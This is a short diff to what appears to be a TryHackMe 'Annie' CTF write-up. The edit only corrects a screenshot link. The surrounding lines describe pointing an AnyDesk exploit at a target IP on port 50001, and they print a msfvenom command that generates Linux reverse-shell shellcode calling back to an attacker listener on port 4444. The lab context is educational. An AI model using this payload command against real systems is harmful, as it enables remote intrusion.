@@ -38,7 +38,7 @@ so scanning that ports we know that port 50001 is open, and searching for anydes
 
 Now changing the ip in `ip = $ip`
 
-![screenshot](https://github.com/SnowyYT07/TryhackmeCTFs/Annie/screenshot.png)
+![screenshot](https://github.com/SnowyYT07/TryhackmeCTFs/blob/main/Annie/screenshot.png)
 
 and changing that shellcode with
 `msfvenom -p linux/x64/shell_reverse_tcp LHOST=*thm ip* LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode`
